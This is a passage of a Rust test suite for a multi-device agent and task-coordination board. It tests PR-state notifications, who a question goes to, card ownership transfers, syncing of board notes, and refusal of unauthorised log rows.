/// doesn't push the OPEN out while both wait on the card's holder.
#[test]
fn a_held_error_row_keeps_the_held_open_row() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, owners) = two_people();
    let b2 = side_with("dev-b2", P2, &owners, false);
    let far = side_with("dev-a2", P1, &owners, false);
    for s in [&b2, &far] {
        pull(&a, s);
        pull(&b, s);
    }
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    pull(&a, &far);
    pull(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    pull(&a, &b2);
    pull(&b, &b2);
    b2.clk.add(Duration::from_secs(60));
    b2.c.record_pr_state(&t.id, pr_check(PR, PR_OPEN, ""))
        .unwrap();
    b2.clk.add(Duration::from_secs(60));
    b2.c.record_pr_state(
        &t.id,
        PrCheck {
            pr: PR.into(),
            error: "gh broke".into(),
            ..PrCheck::default()
        },
    )
    .unwrap();

    pull_dev(&b2, &far, "dev-b2");
    assert!(far.c.pr_state(&t.id, PR).is_none());
    pull(&b, &far);
    let st = far.c.pr_state(&t.id, PR).unwrap();
    assert_eq!(
        (st.state.as_str(), st.error.as_str()),
        (PR_OPEN, "gh broke")
    );
}

/// Card #548, from the review: a closed PR's review changing says nothing
/// new, a PR reopened with its old review is a reopen, not a new request,
/// and a PR the card let go of, or a card waiting on Done, is nobody's news.
#[test]
fn pr_news_skips_what_says_nothing_new() {
    const PR: &str = "https://github.com/a/b/pull/7";
    const OTHER: &str = "https://github.com/a/b/pull/8";
    let (a, b, _) = two_people();
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    b.c.add_link(CARD2, &t.id, OTHER).unwrap();
    sync(&a, &b);
    let step = |pr: &str, state: &str, review: &str| {
        b.clk.add(Duration::from_secs(60));
        b.c.record_pr_state(
            &t.id,
            PrCheck {
                pr: pr.into(),
                state: state.into(),
                review: review.into(),
                ..PrCheck::default()
            },
        )
        .unwrap();
        sync(&a, &b);
        a.c.pr_news()
    };
    step(PR, PR_OPEN, PR_CHANGES_REQUESTED);
    let closed = step(PR, PR_CLOSED, PR_CHANGES_REQUESTED);
    let moved = step(PR, PR_CLOSED, "APPROVED");
    assert_eq!(closed[0].mark, moved[0].mark);
    step(PR, PR_CLOSED, PR_CHANGES_REQUESTED);
    let back = step(PR, PR_OPEN, PR_CHANGES_REQUESTED);
    assert!(back[0].notice.text.contains("was reopened"));
    assert!(!back[0].notice.wake);

    // Merged, then unlinked: gone. The other PR's merge still counts.
    let merged = step(OTHER, PR_MERGED, "");
    assert_eq!(merged.len(), 2);
    b.c.remove_link(CARD2, &t.id, OTHER).unwrap();
    sync(&a, &b);
    let news = a.c.pr_news();
    assert_eq!(news.len(), 1);
    assert!(!news[0].mark.contains(OTHER), "{}", news[0].mark);
}

/// Card #210: the PR poller's pr.state row (actor irori) folds on a board
/// when a device of the holder's person writes it, so a merge wakes the
/// holder once, not at every poll. Any other device's row counts nowhere.
#[test]
fn a_merged_pr_on_a_board_card_tells_the_holder_once() {
    const PR: &str = "https://github.com/a/b/pull/7";
    let (a, b, _) = two_people();
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    sync(&a, &b);
    let merged = || PrCheck {
        pr: PR.into(),
        state: PR_MERGED.into(),
        ..PrCheck::default()
    };

    // p1's device doesn't hold the card: its row counts nowhere, and
    // nobody is told.
    let before = a.c.ignored_rows();
    let err = a.c.record_pr_state(&t.id, merged()).unwrap_err();
    assert!(err.to_string().contains("wasn't taken"), "{err}");
    assert_eq!(a.c.ignored_rows(), before + 1);
    sync(&a, &b);
    assert!(b.c.pr_states(&t.id).is_empty());

    // The holder's device: told once, and both sides know it merged.
    b.clk.add(Duration::from_secs(60));
    let (_, ns) = b.c.record_pr_state(&t.id, merged()).unwrap();
    assert_eq!(ns.len(), 1);
    assert!(ns[0].text.contains("was merged"), "{}", ns[0].text);
    sync(&a, &b);
    for s in [&a, &b] {
        let st = s.c.pr_states(&t.id);
        assert_eq!((st.len(), st[0].state.as_str()), (1, PR_MERGED));
    }

    // Heard again (the card still open): nothing new.
    b.clk.add(Duration::from_secs(180));
    let (_, ns) = b.c.record_pr_state(&t.id, merged()).unwrap();
    assert!(ns.is_empty(), "a merged PR is told once");
}

/// Card #509: on a board, an agent's external wait on a PR is polled by
/// its own person's device, not every member's, even after the agent left
/// the card, and its row folds everywhere. Card #970: it needs nobody.
#[test]
fn a_pr_wait_on_a_board_is_polled_by_its_raisers_person() {
    const PR: &str = "https://github.com/a/b/pull/41";
    let (a, b, _) = two_people();
    let t = a.c.create_task(P1, nt("part 10", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.block(
        CARD2,
        &t.id,
        "Review and merge PR #41",
        Some(BlockedBy {
            kind: BLOCKED_ON_EXTERNAL.into(),
            reference: PR.into(),
        }),
    )
    .unwrap();
    b.c.leave(CARD2, &t.id, CARD2).unwrap();
    sync(&a, &b);
    let needs = |s: &Side, viewer: &str| {
        s.c.board(&BoardFilter {
            viewer: viewer.into(),
            ..BoardFilter::default()
        })
        .needs_you
        .iter()
        .any(|c| c.task.id == t.id)
    };
    assert!(!needs(&a, P1), "p2's agent's wait isn't p1's");
    assert!(a.c.polled_waits(&t.id).is_empty());
    assert!(!needs(&b, P2), "nor p2's merge");
    assert_eq!(b.c.polled_waits(&t.id), vec![PR.to_string()]);

    // p2's device hears it merged, though nobody holds the card: it folds
    // on both sides and the wait no longer needs p2.
    let merged = PrCheck {
        pr: PR.into(),
        state: PR_MERGED.into(),
        ..PrCheck::default()
    };
    assert!(a.c.record_pr_state(&t.id, merged.clone()).is_err());
    b.c.record_pr_state(&t.id, merged).unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        assert_eq!(s.c.pr_state(&t.id, PR).unwrap().state, PR_MERGED);
    }
    assert!(b.c.polled_waits(&t.id).is_empty());
    assert!(!needs(&b, P2));
}

/// #230: a board card in review links a merged PR as context and its own
/// PR, still open. The context PR's merge is told once, without a wake
/// and without asking for completed; heard again it says nothing; the own
/// PR's merge then asks for completed.
#[test]
fn a_merged_context_pr_beside_an_open_own_pr_is_told_once_without_a_wake() {
    const CONTEXT: &str = "https://github.com/a/b/pull/271";
    const OWN: &str = "https://github.com/a/b/pull/273";
    let (a, b, _) = two_people();
    let t = a.c.create_task(P1, nt("aimed shots", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, CONTEXT).unwrap();
    b.c.add_link(CARD2, &t.id, OWN).unwrap();
    sync(&a, &b);
    let heard = |pr: &str, state: &str| PrCheck {
        pr: pr.into(),
        state: state.into(),
        ..PrCheck::default()
    };

    b.clk.add(Duration::from_secs(60));
    let (_, ns) = b.c.record_pr_state(&t.id, heard(OWN, PR_OPEN)).unwrap();
    assert!(ns.is_empty());
    b.c.set_task_state(CARD2, &t.id, IN_REVIEW, "PR open")
        .unwrap();

    b.clk.add(Duration::from_secs(60));
    let (_, ns) =
        b.c.record_pr_state(&t.id, heard(CONTEXT, PR_MERGED))
            .unwrap();
    assert_eq!(ns.len(), 1);
    assert!(!ns[0].wake, "a context PR's merge wakes nobody");
    assert!(ns[0].text.contains("was merged"), "{}", ns[0].text);
    assert!(ns[0].text.contains(OWN), "{}", ns[0].text);
    assert!(!ns[0].text.contains("state=completed"), "{}", ns[0].text);
    sync(&a, &b);

    // Every later poll: the row stuck, so nothing new on either side.
    for _ in 0..5 {
        b.clk.add(Duration::from_secs(180));
        let (_, ns) =
            b.c.record_pr_state(&t.id, heard(CONTEXT, PR_MERGED))
                .unwrap();
        assert!(ns.is_empty(), "told once");
        let (_, ns) = b.c.record_pr_state(&t.id, heard(OWN, PR_OPEN)).unwrap();
        assert!(ns.is_empty());
        sync(&a, &b);
    }
    for s in [&a, &b] {
        let st = s.c.pr_states(&t.id);
        assert!(st.iter().any(|p| p.pr == CONTEXT && p.state == PR_MERGED));
    }

    // The card's own PR merges: now the holder is woken to complete.
    b.clk.add(Duration::from_secs(180));
    let (_, ns) = b.c.record_pr_state(&t.id, heard(OWN, PR_MERGED)).unwrap();
    assert_eq!(ns.len(), 1);
    assert!(ns[0].wake);
    assert!(ns[0].text.contains("state=completed"), "{}", ns[0].text);
}

// ---- a gone holder on a board (card #242) ------------------------------------

/// task.left rows `dev` wrote, as `s` holds them.
fn lefts_by(s: &Side, dev: &str) -> usize {
    s.st.missing(&Default::default(), 100_000)
        .unwrap()
        .iter()
        .filter(|e| e.kind == kinds::TASK_LEFT && e.device_id == dev)
        .count()
}

#[test]
fn a_gone_agent_of_another_person_is_left_once_by_its_own_device() {
    let ra = TestRoster::new(&[CARD1]);
    let rb = TestRoster::new(&[CARD2]);
    let (a, b, _) = two_people_with(Some(ra), Some(rb.clone()));
    let tk = a.c.create_task(P1, nt("p1's card", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &tk.id).unwrap();
    sync(&a, &b);
    assert_eq!(a.c.get_task(&tk.id).unwrap().holders, [CARD2]);
    // p2's agent goes away. dev-a never had it live; dev-b sees it go.
    rb.set(CARD2, "");
    for s in [&a, &b] {
        s.c.sweep().unwrap();
        s.clk.add(HOLDER_GRACE + Duration::from_secs(1));
    }
    // dev-a may not take p2's agent off: its task.left would fold to
    // nothing, so it writes none, sweep after sweep.
    for _ in 0..5 {
        a.c.sweep().unwrap();
        a.clk.add(Duration::from_secs(5));
    }
    assert_eq!(lefts_by(&a, "dev-a"), 0);
    assert_eq!(a.c.get_task(&tk.id).unwrap().holders, [CARD2]);
    // dev-b, p2's device, takes it off once, and the card is free on both.
    for _ in 0..5 {
        b.c.sweep().unwrap();
        b.clk.add(Duration::from_secs(5));
        sync(&a, &b);
        a.c.sweep().unwrap();
    }
    assert_eq!(lefts_by(&b, "dev-b"), 1);
    assert_eq!(lefts_by(&a, "dev-a"), 0);
    for s in [&a, &b] {
        assert!(s.c.get_task(&tk.id).unwrap().holders.is_empty());
    }
}

// ---- who decides (card #264) ------------------------------------------------

fn ask(s: &Side, by: &str, id: &str, q: &str, on: Option<BlockedBy>) -> Result<(Task, Blocker)> {
    s.c.raise(
        by,
        id,
        NewBlocker {
            question: q.into(),
            blocked_by: on,
            ..NewBlocker::default()
        },
    )
}

fn for_person(key: &str) -> Option<BlockedBy> {
    Some(BlockedBy {
        kind: BLOCKED_ON_PERSON.into(),
        reference: key.into(),
    })
}

fn needs(s: &Side, viewer: &str) -> Vec<String> {
    s.c.board(&BoardFilter {
        viewer: viewer.into(),
        done_limit: 1,
        ..BoardFilter::default()
    })
    .needs_you
    .into_iter()
    .map(|c| c.task.id)
    .collect()
}

#[test]
fn a_question_on_a_board_is_for_the_cards_owner_by_default() {
    let (a, b, _) = two_people();
    // p1 made the card; p2's agent asks without saying who decides: it is
    // for p1, the owner (#429), not p2.
    let t = shared_card(&a, &b);
    let (_, item) = ask(&b, CARD2, &t.id, "Which colour?", None).unwrap();
    assert_eq!(item.on, for_person(P1));
    sync(&a, &b);
    let on_a = a.c.get_task(&t.id).unwrap();
    assert_eq!(
        on_a.open_blockers()[0].on,
        for_person(P1),
        "both folds agree"
    );
    assert_eq!(needs(&a, P1), vec![t.id.clone()], "it needs p1");
    assert!(needs(&b, P2).is_empty(), "and not p2");
    // An explicit "person" with no one named is the owner too.
    let (_, item) = ask(&b, CARD2, &t.id, "Ship it?", for_person("")).unwrap();
    assert_eq!(item.on, for_person(P1));
    // The owner's own agent asks: still the owner.
    let (_, item) = ask(&a, CARD1, &t.id, "Rename it?", None).unwrap();
    assert_eq!(item.on, for_person(P1));
    // for still names someone else.
    let (_, item) = ask(&b, CARD2, &t.id, "Blake's call?", for_person(P2)).unwrap();
    assert_eq!(item.on, for_person(P2));
}

/// #429: p2's agent finishing p1's card asks p1 "Is this done?", not p2.
#[test]
fn a_done_check_on_a_board_goes_to_the_cards_owner() {
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let a = side_full("dev-a", P1, &owners, true, None);
    let b = side_full("dev-b", P2, &owners, true, None);
    a.st.append(
        P1,
        kinds::BOARD_CREATED,
        &raw(r#"{"boardId":"b","creator":{"personId":"p1"},"name":"wind","tag":"wind"}"#),
    )
    .unwrap();
    a.st.append(
        P1,
        kinds::BOARD_MEMBER_ADDED,
        &raw(r#"{"personId":"p2","role":"member"}"#),
    )
    .unwrap();
    pull(&a, &b);
    b.st.append(
        CARD2,
        kinds::AGENT_CARD,
        &raw(r#"{"cardId":"c2","personId":"p2","status":"active"}"#),
    )
    .unwrap();
    sync(&a, &b);
    let t = a.c.create_task(P1, nt("p1's card", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    let got =
        b.c.set_task_state(CARD2, &t.id, COMPLETED, "shipped")
            .unwrap();
    let check = got
        .blockers
        .iter()
        .find(|x| x.open() && x.done_check)
        .expect("a done check");
    assert_eq!(check.on, for_person(P1));
    sync(&a, &b);
    assert_eq!(needs(&a, P1), vec![t.id.clone()], "the owner decides Done");
    assert!(
        needs(&b, P2).is_empty(),
        "not the person whose agent did it"
    );
}

#[test]
fn a_question_can_be_for_another_member() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let (_, item) = ask(&a, CARD1, &t.id, "Blake: OK to rename?", for_person(P2)).unwrap();
    assert_eq!(item.on, for_person(P2));
    sync(&a, &b);
    assert_eq!(needs(&b, P2), vec![t.id.clone()]);
    assert!(needs(&a, P1).is_empty(), "p1's agent asked, but p2 decides");
    // Anyone can still answer: p1 resolves p2's question.
    a.c.answer(
        P1,
        &t.id,
        &item.id,
        BlockerAnswer {
            text: "yes".into(),
            resolve: true,
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
    // Nobody who isn't on the board can be asked.
    let e = ask(&a, CARD1, &t.id, "Who?", for_person("person:p9")).unwrap_err();
    assert!(e.is(ErrorKind::Invalid), "{e}");
}

/// Card #236: wind#16's holder heard "PR merged" four times, the later ones
/// after the card was set completed and waited on the person's Done. Once
/// the merge is told, a completed card awaiting Done stays quiet at every
/// later poll, from either device.
#[test]
fn a_merged_pr_on_a_completed_board_card_awaiting_done_is_not_told_again() {
    const PR: &str = "https://github.com/a/b/pull/9";
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let a = side_full("dev-a", P1, &owners, true, None);
    let b = side_full("dev-b", P2, &owners, true, None);
    a.st.append(
        P1,
        kinds::BOARD_CREATED,
        &raw(r#"{"boardId":"b","creator":{"personId":"p1"},"name":"wind","tag":"wind"}"#),
    )
    .unwrap();
    a.st.append(
        P1,
        kinds::BOARD_MEMBER_ADDED,
        &raw(r#"{"personId":"p2","role":"member"}"#),
    )
    .unwrap();
    pull(&a, &b);
    b.st.append(
        CARD2,
        kinds::AGENT_CARD,
        &raw(r#"{"cardId":"c2","personId":"p2","status":"active"}"#),
    )
    .unwrap();
    sync(&a, &b);
    let t = a.c.create_task(P1, nt("ship it", "")).unwrap();
    sync(&a, &b);
    b.c.claim_task(CARD2, &t.id).unwrap();
    b.c.add_link(CARD2, &t.id, PR).unwrap();
    sync(&a, &b);
    let merged = || PrCheck {
        pr: PR.into(),
        state: PR_MERGED.into(),
        ..PrCheck::default()
    };

    b.clk.add(Duration::from_secs(60));
    let (_, ns) = b.c.record_pr_state(&t.id, merged()).unwrap();
    assert_eq!(ns.len(), 1);

    // The holder sets it completed: it waits on the person's Done.
    let got =
        b.c.set_task_state(CARD2, &t.id, COMPLETED, "shipped")
            .unwrap();
    assert_eq!(got.state, BLOCKED);
    assert!(got.blockers.iter().any(|x| x.open() && x.done_check));
    sync(&a, &b);

    // Four more polls, 3 minutes apart (wind#16's repeats): nothing.
    for _ in 0..4 {
        b.clk.add(Duration::from_secs(180));
        let (_, ns) = b.c.record_pr_state(&t.id, merged()).unwrap();
        assert!(
            ns.is_empty(),
            "told again after completed: {:?}",
            ns[0].text
        );
        sync(&a, &b);
        if let Ok((_, ns)) = a.c.record_pr_state(&t.id, merged()) {
            assert!(ns.is_empty(), "the other device told it again");
        }
        sync(&a, &b);
    }
}

/// Card #337: a subtask on a shared board goes out like a top-level card,
/// to the author's free agent (wind#87-91 got a hand-out row; nobody in
/// the board's pool was free); another member's agents never get it.
#[test]
fn a_board_subtask_is_handed_out_like_a_card() {
    let (a, b) = two_people_shared();
    // p1 holds the parent, so p1's one agent is free for the subtask.
    let p = a.c.create_task(P1, nt("Parent", "")).unwrap();
    a.c.claim_task(P1, &p.id).unwrap();
    let s =
        a.c.create_task(
            P1,
            NewTask {
                title: "Sub".into(),
                parent: p.id.clone(),
                ..NewTask::default()
            },
        )
        .unwrap();
    sync(&a, &b);
    let (ns, r) = a.c.sweep_asks_partial(&roster(&[CARD2, CARD3]));
    r.unwrap();
    assert!(ns.is_empty(), "p2's agents never get p1's subtask: {ns:?}");
    let (ns, r) = a.c.sweep_asks_partial(&roster(&[CARD2, CARD1]));
    r.unwrap();
    assert!(
        ns.len() == 1 && ns[0].to == [CARD1] && ns[0].task_id == s.id,
        "{ns:?}"
    );
    assert_eq!(a.c.get_task(&s.id).unwrap().live_offer().unwrap().to, CARD1);
}

/// side_reopen, with `leases` as the live leases this person's agents hold
/// on their private board (card #339).
fn side_with_leases(
    s: Side,
    person: &str,
    owners: &Owners,
    leases: Arc<Mutex<Vec<String>>>,
) -> Side {
    let me = person.to_string();
    let o2 = owners.clone();
    let o = Options {
        now: Some(s.clk.func()),
        board: true,
        person: person.into(),
        is_owner: Some(Arc::new(move |k: &str| k == me)),
        key_person: Some(Arc::new(key_person)),
        device_person: Some(Arc::new(device_person)),
        tag: Some(Arc::new(|| "mlg".to_string())),
        board_owner: Some(Arc::new(move |p: &str, at: Option<&RowPos>| {
            o2.lock().unwrap().iter().any(|(who, from, until)| {
                who == p && at.map_or(*until == u64::MAX, |at| *from < at.hlc && at.hlc < *until)
            })
        })),
        outside_leases: Some(Arc::new(move || leases.lock().unwrap().clone())),
        ..Options::default()
    };
    let c = Coord::new(s.st.clone(), None, o).unwrap();
    Side { c, ..s }
}

/// Card #339, wind#91's case: a board card's external wait names leases
/// that live on its agent's private board. Its person's device closes the
/// wait when the last goes and tells the holder; the other member's
/// device, which can't see those leases, leaves it alone.
#[test]
fn a_board_card_waits_on_its_persons_private_leases() {
    let (a, b, owners) = two_people();
    let la = Arc::new(Mutex::new(vec![
        "ww/dolphin-slot-1".to_string(),
        "ww/dolphin-slot-2".to_string(),
    ]));
    let a = side_with_leases(a, P1, &owners, la.clone());
    let b = side_with_leases(b, P2, &owners, Arc::new(Mutex::new(Vec::new())));
    let t = a.c.create_task(P1, nt("UDP pose transport", "")).unwrap();
    a.c.claim_task(CARD1, &t.id).unwrap();
    let got =
        a.c.block(
            CARD1,
            &t.id,
            "Waiting for a free Dolphin slot",
            Some(BlockedBy {
                kind: BLOCKED_ON_EXTERNAL.into(),
                reference: "a free ww/dolphin-slot-1..4 lease (all four held)".into(),
            }),
        )
        .unwrap();
    // Named leases never show on a board: the wait stays in the agent's
    // words, and p1's devices judge it against p1's private leases.
    assert_eq!(
        got.blocked_by,
        Some(BlockedBy {
            kind: BLOCKED_ON_EXTERNAL.into(),
            reference: "a free ww/dolphin-slot-1..4 lease (all four held)".into(),
        })
    );
    sync(&a, &b);
    assert!(a.c.sweep_notices().unwrap().is_empty());
    assert!(
        b.c.sweep_notices().unwrap().is_empty(),
        "p2's device can't see p1's leases"
    );
    assert_eq!(b.c.get_task(&t.id).unwrap().state, BLOCKED);
    la.lock().unwrap().retain(|n| n != "ww/dolphin-slot-1");
    assert!(a.c.sweep_notices().unwrap().is_empty(), "slot 2 still held");
    la.lock().unwrap().clear();
    let ns = a.c.sweep_notices().unwrap();
    assert_eq!(ns.len(), 1, "{ns:?}");
    assert_eq!(
        (ns[0].kind.as_str(), ns[0].to.clone()),
        (NOTICE_UNBLOCKED, vec![CARD1.to_string()])
    );
    assert_eq!(a.c.get_task(&t.id).unwrap().state, WORKING);
    sync(&a, &b);
    assert_eq!(b.c.get_task(&t.id).unwrap().state, WORKING);
}

fn board_note(text: &str) -> NewNote {
    NewNote {
        kind: "gotcha".into(),
        text: text.into(),
        tags: vec![format!("repo:{REPO_A}")],
        ..NewNote::default()
    }
}

/// Board logs still take note rows (card #616: an older device can write
/// them, and Irori no longer reads them), and fold them like the private
/// log's: live at once, on every member's device.
#[test]
fn a_board_note_row_syncs_to_every_member() {
    let (a, b, _) = two_people();
    let n =
        a.c.propose_note(CARD1, board_note("MLG models ship to the repo, not zips."))
            .unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        assert_eq!(s.c.note_by_id(&n.id).unwrap().state, NOTE_ACCEPTED);
    }
    // Either member removes it.
    a.c.remove_note(P1, &n.id, "done with zips").unwrap();
    sync(&a, &b);
    assert_eq!(b.c.note_by_id(&n.id).unwrap().state, NOTE_REMOVED);
}

#[test]
fn a_board_note_names_only_cards_on_the_board() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let mut n = board_note("from the card");
    n.task_id = t.id.clone();
    n.source = format!("task:{}", t.id);
    a.c.propose_note(CARD1, n.clone()).unwrap();
    n.task_id = "01NOTONTHISBOARD0000000000".into();
    let e = a.c.propose_note(CARD1, n).unwrap_err();
    assert!(e.is(ErrorKind::NotFound), "{e}");
}

/// "Agents answer now" off on a shared board (card #391, irori#6): "@p2
/// look at #N" names only a person, so it wakes no agent and is never
/// handed out; the holders of the card it names read it at their next
/// turn, and one of them may still answer with a correction.
#[test]
fn a_board_thread_naming_only_a_person_wakes_no_agent() {
    let (a, b, _) = two_people();
    let card = shared_card(&a, &b);
    let mentions = vec![Mention {
        key: P2.into(),
        name: "p2".into(),
        ..Mention::default()
    }];
    assert!(!agents_now_default(&mentions), "only a person is named");
    let (tk, n) =
        a.c.post_ask(
            P1,
            NewAsk {
                text: format!("@p2 look at #{}", card.short),
                mentions,
                thread: true,
                quiet: true,
                ..NewAsk::default()
            },
            &[],
        )
        .unwrap();
    assert!(
        n.to == [CARD1, CARD2] && !n.wake && n.text.contains("optional"),
        "read at their next turn, not woken: {n:?}"
    );
    sync(&a, &b);
    for s in [&a, &b] {
        let ask = s.c.get_task(&tk.id).unwrap().ask.unwrap();
        assert!(ask.thread && !ask.wake && ask.taker.is_empty(), "{ask:?}");
    }

    // Minutes on an idle agent is free, but it isn't handed out.
    a.clk.add(Duration::from_secs(120));
    b.clk.add(Duration::from_secs(120));
    assert!(a.c.sweep_asks(&[idle(CARD3, "dev-b")]).unwrap().is_empty());
    sync(&a, &b);
    assert!(b.c.get_task(&tk.id).unwrap().ask.unwrap().taker.is_empty());

    // card1 reads it at its next turn and corrects it.
    a.c.add_comment(CARD1, &tk.id, "That one merged already; see #1.", false)
        .unwrap();
    sync(&a, &b);
    assert!(a.c.sweep_asks(&[idle(CARD3, "dev-b")]).unwrap().is_empty());
    let t = a.c.get_task(&tk.id).unwrap();
    assert!(
        t.holders.is_empty() && !t.ask.as_ref().unwrap().wake,
        "{t:?}"
    );

    // p1's next post: the thread is still off, so even a waking post
    // wakes nobody, here or through p2's bridge (the row isn't wake).
    let (cm, ns) =
        a.c.person_comment(P1, &tk.id, "Thanks, I missed that.", true, &[], None)
            .unwrap();
    assert!(!cm.wake, "{cm:?}");
    assert!(
        !ns.is_empty()
            && ns
                .iter()
                .all(|n| !n.wake && n.text.contains("Since you last read")),
        "{ns:?}"
    );
}

// ---- card #432: a card's owner changes hands when both agree ----

/// The open ownership item on `t` as `s` folds it.
fn transfer_item(s: &Side, id: &str) -> Blocker {
    s.c.get_task(id)
        .unwrap()
        .blockers
        .into_iter()
        .find(|b| b.open() && b.transfer)
        .expect("an open ownership item")
}

fn pick(s: &Side, by: &str, id: &str, bid: &str, n: i64) -> Result<(Task, Vec<Notice>)> {
    s.c.answer(
        by,
        id,
        bid,
        BlockerAnswer {
            pick: n,
            ..BlockerAnswer::default()
        },
    )
}

#[test]
fn an_offered_card_moves_to_the_member_who_accepts() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let (_, item) = a.c.transfer_owner(P1, &t.id, "p2").unwrap();
    assert!(item.transfer);
    assert_eq!(item.on, for_person(P2), "the other side decides");
    assert_eq!(
        item.options
            .iter()
            .map(|o| o.answer.as_str())
            .collect::<Vec<_>>(),
        vec![OWNER_ACCEPT, OWNER_DECLINE]
    );
    sync(&a, &b);
    assert_eq!(needs(&b, P2), vec![t.id.clone()], "it needs p2");
    // The owner can't accept their own offer, and no agent can.
    assert!(pick(&a, P1, &t.id, &item.id, 1).is_err());
    assert!(
        b.c.answer(
            CARD2,
            &t.id,
            &item.id,
            BlockerAnswer {
                text: "accept".into(),
                resolve: true,
                ..BlockerAnswer::default()
            }
        )
        .is_err()
    );
    pick(&b, P2, &t.id, &item.id, 1).unwrap();
    sync(&a, &b);
    for (s, who) in [(&a, "a"), (&b, "b")] {
        let got = s.c.get_task(&t.id).unwrap();
        assert_eq!(got.owner, "p2", "{who}: p2 owns it");
        assert!(got.owner_transfer.is_none(), "{who}: nothing pending");
        assert!(!got.blockers.iter().any(|x| x.open()), "{who}: item closed");
    }
    // From now on an unnamed question, and the done check, are p2's.
    let (_, q) = ask(&a, CARD1, &t.id, "Which colour?", None).unwrap();
    assert_eq!(q.on, for_person(P2));
}

#[test]
fn a_declined_offer_leaves_the_owner() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let (_, item) = a.c.transfer_owner(P1, &t.id, "p2").unwrap();
    sync(&a, &b);
    pick(&b, P2, &t.id, &item.id, 2).unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let got = s.c.get_task(&t.id).unwrap();
        assert_eq!(got.owner, "", "still the creator's");
        assert!(got.owner_transfer.is_none());
        assert!(!got.blockers.iter().any(|x| x.open()));
    }
    let (_, q) = ask(&b, CARD2, &t.id, "Which colour?", None).unwrap();
    assert_eq!(q.on, for_person(P1));
    // A new offer can go out once that one is over.
    a.c.transfer_owner(P1, &t.id, "p2").unwrap();
}

#[test]
fn a_member_asks_for_a_card_and_the_owner_accepts() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let (_, item) = b.c.transfer_owner(P2, &t.id, "").unwrap();
    assert_eq!(item.on, for_person(P1), "the owner decides");
    sync(&a, &b);
    assert_eq!(transfer_item(&a, &t.id).id, item.id);
    assert!(
        a.c.transfer_owner(P1, &t.id, "p2").is_err(),
        "one transfer at a time"
    );
    // The asker can't accept their own request.
    assert!(pick(&b, P2, &t.id, &item.id, 1).is_err());
    pick(&a, P1, &t.id, &item.id, 1).unwrap();
    sync(&a, &b);
    assert_eq!(a.c.get_task(&t.id).unwrap().owner, "p2");
    assert_eq!(b.c.get_task(&t.id).unwrap().owner, "p2");
    // p2 owns it now, so p1 asking for it back is a request to p2.
    let (_, back) = a.c.transfer_owner(P1, &t.id, "").unwrap();
    assert_eq!(back.on, for_person(P2));
}

#[test]
fn an_owner_row_from_the_wrong_side_is_ignored() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    // p2's device writes an accept with no offer, then an offer of a card
    // it doesn't own: neither counts on either fold.
    for op in ["accept", "offer"] {
        b.st.append(
            P2,
            kinds::TASK_OWNER,
            &raw(&format!(
                r#"{{"taskId":"{}","op":"{op}","person":"p2","by":"person:p2","at":"2026-11-03T00:00:00Z"}}"#,
                t.id
            )),
        )
        .unwrap();
    }
    sync(&a, &b);
    for s in [&a, &b] {
        let got = s.c.get_task(&t.id).unwrap();
        assert_eq!(got.owner, "");
        assert!(got.owner_transfer.is_none());
    }
    // And p1's own device can't accept its own offer behind the tool's back.
    let (_, item) = a.c.transfer_owner(P1, &t.id, "p2").unwrap();
    a.st.append(
        P1,
        kinds::TASK_OWNER,
        &raw(&format!(
            r#"{{"taskId":"{}","op":"accept","person":"p2","blockerId":"{}","by":"person:p1","at":"2026-11-03T00:00:00Z"}}"#,
            t.id, item.id
        )),
    )
    .unwrap();
    sync(&a, &b);
    assert_eq!(b.c.get_task(&t.id).unwrap().owner, "");
    assert_eq!(a.c.get_task(&t.id).unwrap().owner, "");
}

fn spawn_step(text: &str) -> Step {
    Step {
        text: text.into(),
        spawn: true,
        ..Step::default()
    }
}

/// Part 7 (spawned agents §3): another person's agent can edit p1's
/// card's steps, but its spawn marks are set aside, on both sides; p1's
/// own agent sets one.
#[test]
fn another_persons_spawn_mark_on_a_card_is_refused() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let got =
        b.c.set_steps(CARD2, &t.id, vec![spawn_step("tests")])
            .unwrap();
    assert_eq!(got.steps[0].text, "tests", "the edit goes through");
    assert!(!got.steps[0].spawn, "the mark doesn't");
    sync(&a, &b);
    assert!(!a.c.get_task(&t.id).unwrap().steps[0].spawn);
    // A row written straight to the log gets no further.
    b.st.append(
        CARD2,
        kinds::TASK_STEPS,
        &coord::rows::TaskStepsRow {
            task_id: t.id.clone(),
            steps: vec![Step {
                id: "s1".into(),
                ..spawn_step("tests")
            }],
            by: CARD2.into(),
            at: fixed_now(),
        },
    )
    .unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        assert!(!s.c.get_task(&t.id).unwrap().steps[0].spawn);
    }
    // The owner's agent marks it, and both sides agree.
    a.c.set_steps(CARD1, &t.id, vec![spawn_step("tests")])
        .unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        assert!(s.c.get_task(&t.id).unwrap().steps[0].spawn);
    }
